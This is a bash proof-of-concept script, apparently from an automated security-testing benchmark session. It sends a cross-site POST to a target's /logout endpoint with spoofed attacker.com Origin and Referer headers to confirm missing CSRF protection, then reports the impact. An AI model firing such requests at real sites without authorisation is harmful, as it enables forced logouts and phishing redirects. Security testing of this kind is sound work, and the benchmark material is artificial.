#!/bin/bash
# POC: Demonstrates CSRF vulnerability on logout endpoint with cross-site POST without token validation
# Target: ./repo
# Created: 2025-11-04T17:44:44.160Z
# Session: benchmark-XBEN-027-24-mhku5fyk

# CSRF Logout Attack POC - Final Version
# Demonstrates logout endpoint accepts POST requests without CSRF token validation

TARGET_URL="${1:-http://localhost:8080}"

echo "=== CSRF Logout Endpoint Vulnerability POC ==="
echo "Target: $TARGET_URL/logout"
echo ""

# Step 1: Send CSRF logout request from cross-site origin
echo "[*] Step 1: Sending CSRF logout POST request from cross-site origin..."
echo "    - Endpoint: /logout"
echo "    - Method: POST"
echo "    - Origin: http://attacker.com (cross-site)"
echo "    - CSRF Token: NONE (not included)"
echo "    - Referer: http://attacker.com/csrf (cross-site referrer)"
echo ""

# Perform the CSRF logout attack
CSRF_RESPONSE=$(curl -s -i -X POST "$TARGET_URL/logout" \
  -H "Referer: http://attacker.com/csrf" \
  -H "Origin: http://attacker.com" \
  -H "Content-Type: application/x-www-form-urlencoded")

echo "[*] Response received:"
echo "$CSRF_RESPONSE" | head -20
echo ""

# Step 2: Analyze the response for vulnerability indicators
echo "[*] Step 2: Analyzing response for CSRF vulnerability indicators..."
echo ""

# Extract status code
STATUS=$(echo "$CSRF_RESPONSE" | head -1)
echo "Status: $STATUS"

# Check for 403 Forbidden (would indicate CSRF protection)
if echo "$CSRF_RESPONSE" | grep -q "HTTP.*403"; then
    echo "[-] Server returned 403 Forbidden - CSRF protection detected"
    exit 1
fi

# Check for successful response
if echo "$CSRF_RESPONSE" | grep -q "HTTP.*302\|HTTP.*200"; then
    echo "[+] Server accepted the POST request (no 403 error)"
    echo "[+] Response indicates successful logout processing"
    echo ""
    
    # Check for Set-Cookie header (session clearing)
    if echo "$CSRF_RESPONSE" | grep -i "Set-Cookie" >/dev/null; then
        COOKIE=$(echo "$CSRF_RESPONSE" | grep -i "Set-Cookie")
        echo "[+] Set-Cookie header present: $COOKIE"
    fi
    
    # Check Location header (redirect)
    if echo "$CSRF_RESPONSE" | grep -i "Location:" >/dev/null; then
        LOCATION=$(echo "$CSRF_RESPONSE" | grep -i "Location:")
        echo "[+] Redirect location: $LOCATION"
    fi
    
    echo ""
    echo "[+] CSRF VULNERABILITY CONFIRMED!"
    echo "[+] The logout endpoint:"
    echo "    ✓ Accepts POST requests from any origin"
    echo "    ✓ Does NOT require CSRF token validation"
    echo "    ✓ Returns successful response (302/200) instead of 403"
    echo "    ✓ Processes logout request without CSRF protection"
    echo ""
    echo "[+] Impact:"
    echo "    - Attacker can force user logout via malicious website"
    echo "    - Session will be cleared without user consent"
    echo "    - User can be redirected to phishing page after logout"
    echo "    - Combined with other vulnerabilities, enables session hijacking"
    echo ""
    exit 0
    
else
    echo "[!] Unexpected response status"
    exit 1
fi